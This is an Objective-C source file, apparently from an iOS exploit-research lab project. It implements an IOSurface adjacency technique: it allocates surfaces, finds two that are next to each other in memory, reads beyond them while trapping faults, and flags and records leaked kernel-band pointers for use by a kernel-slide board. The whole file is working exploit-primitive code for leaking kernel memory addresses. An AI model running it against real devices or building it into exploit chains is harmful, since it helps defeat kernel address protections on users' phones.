//
//  P159IOSurfaceAdjacency.m
//  P007OpenOnly
//
//  Technique from Rust505/iosurface-adjacent-oob (MIT). Read-only.
//

#import "P159IOSurfaceAdjacency.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"
#import "LabLearn.h"

#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <setjmp.h>
#import <signal.h>
#include <string.h>

#define P159_BUILD @"p159-iosurface-adjacency-v2-tracked"

static sigjmp_buf g_jmp;
static volatile sig_atomic_t g_faulted;

static void p159_handler(int sig, siginfo_t *si, void *uc) {
    (void)sig; (void)si; (void)uc;
    g_faulted = 1;
    siglongjmp(g_jmp, 1);
}

static BOOL p159_is_kernel(uint64_t v) {
    /* Canonical kernel ranges only. Tags such as 0xffffffa6... and
       0xffffe383... are below the zone map and are NOT kernel pointers. */
    if ([[LabDeviceProfile osversion] hasPrefix:@"24"]) { /* T8150 27.x */
        if (v >= 0xfffffe0000000000ULL && v < 0xfffffe1000000000ULL) return YES;
    } else if (v >= 0xfffffff000000000ULL && v < 0xfffffff100000000ULL) {
        return YES;
    }
    return v >= 0xffffffe000000000ULL && v < 0xfffffff000000000ULL;
}

@implementation P159IOSurfaceAdjacency

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    [o appendFormat:@"=== p159 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P159_BUILD];
    [o appendString:[LabDeviceProfile identBlock]];

    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @0x42475241,
    };
    IOSurfaceRef surfaces[50];
    uintptr_t bases[50];
    int count = 0;
    for (int i = 0; i < 50; i++) {
        IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
        if (!s) continue;
        surfaces[count] = s;
        bases[count] = (uintptr_t)IOSurfaceGetBaseAddress(s);
        count++;
    }
    [o appendFormat:@"  [create] %d/50 surfaces (16 KB each)\n", count];

    int idx = -1;
    for (int i = 0; i < count - 1; i++) {
        if (bases[i] && bases[i + 1] && bases[i + 1] - bases[i] == 0x4000) {
            idx = i;
            break;
        }
    }
    if (idx < 0) {
        [o appendString:@"  [adjacency] none with delta 0x4000\n"];
        for (int i = 0; i < count; i++) CFRelease(surfaces[i]);
        return o;
    }
    uintptr_t b1 = bases[idx], b2 = bases[idx + 1];
    [o appendFormat:@"  [adjacency] idx=%d b1=0x%llx b2=0x%llx delta=0x%llx\n",
        idx, (unsigned long long)b1, (unsigned long long)b2, 0x4000ULL];

    struct sigaction sa, old_segv, old_bus;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = p159_handler;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, &old_segv);
    sigaction(SIGBUS, &sa, &old_bus);

    /* Read-only scan: from b2 to b2+0x10000 (or the first fault). */
    uint64_t kptr = 0, poison = 0, nonzero = 0, sampled = 0;
    uint64_t sample0 = 0;   /* first canonical kernel-band pointer (board anchor) */
    for (uintptr_t addr = b2; addr < b2 + 0x10000; addr += 8) {
        uint64_t v = 0;
        g_faulted = 0;
        if (sigsetjmp(g_jmp, 1) == 0) {
            v = *(volatile uint64_t *)addr;
        } else {
            [o appendFormat:@"  [read] fault at +0x%llx — window ends\n",
                (unsigned long long)(addr - b2)];
            break;
        }
        if (!v) continue;
        nonzero++;
        if (p159_is_kernel(v)) {
            kptr++;
            if (!sample0) sample0 = v;
            if (sampled < 12) {
                [o appendFormat:@"  [kptr] +0x%04llx = 0x%016llx\n",
                    (unsigned long long)(addr - b2), (unsigned long long)v];
                sampled++;
            }
        } else if ((v & 0xFFFFFFFFFFFF0000ULL) == 0xA9A9A9A200000000ULL ||
                   (v & 0xFFFFFFFFFFFFFF00ULL) == 0x3B3B3B3B3B3B3B00ULL) {
            poison++;
        }
    }
    sigaction(SIGSEGV, &old_segv, NULL);
    sigaction(SIGBUS, &old_bus, NULL);
    [o appendFormat:@"  [res] nonzero=%llu canonical-kernel=%llu poison-like=%llu\n",
        (unsigned long long)nonzero, (unsigned long long)kptr,
        (unsigned long long)poison];
    /* v2 honesty law (2026-11-12 receipt): the old static verdict claimed
       "no canonical kernel VAs" even on runs whose own [kptr] rows carried
       15 of them. The verdict is now DERIVED from the counts. Heap-band
       kernel pointers (0xffffffe0..0xffffffef) are LEAK receipts, not
       kbase; heap VAs never derive a slide (P007Board contract). */
    if (kptr > 0) {
        [o appendFormat:@"  [verdict] kptr LEAK receipt: %llu canonical kernel-band pointers read from "
                           @"user VA through the adjacency window (heap band). Leak-class, NOT kbase "
                           @"(heap VAs never derive a slide). Tracked on board + learn.\n",
            (unsigned long long)kptr];
    } else {
        [o appendString:@"  [verdict] read-only adjacency receipt. Adjacency real; this run's window was "
                           @"tags/tagged values only (0 canonical kernel pointers). SurfHeist's kernel-heap "
                           @"claim not reproduced on stock; its OOB write is user-VA adjacent.\n"];
    }
    if (kptr > 0) {
        @try {
            [[P007Board shared] recordHeapLeak:sample0 source:@"p159_isurface"];
        } @catch (__unused NSException *e) {}
        [LabLearn recordPath:@"p159"
                      result:@"KPTR-LEAK"
                    evidence:[NSString stringWithFormat:@"kptr=%llu nonzero=%llu sample=0x%016llx",
                              (unsigned long long)kptr, (unsigned long long)nonzero,
                              (unsigned long long)sample0]];
    } else {
        [LabLearn recordPath:@"p159" result:@"ADJACENCY-ONLY"
                    evidence:[NSString stringWithFormat:@"nonzero=%llu", (unsigned long long)nonzero]];
    }
    [o appendFormat:@"=== p159 end %@ ===\n", LabLocalMilitaryNow()];

    for (int i = 0; i < count; i++) CFRelease(surfaces[i]);
    return o;
}

@end
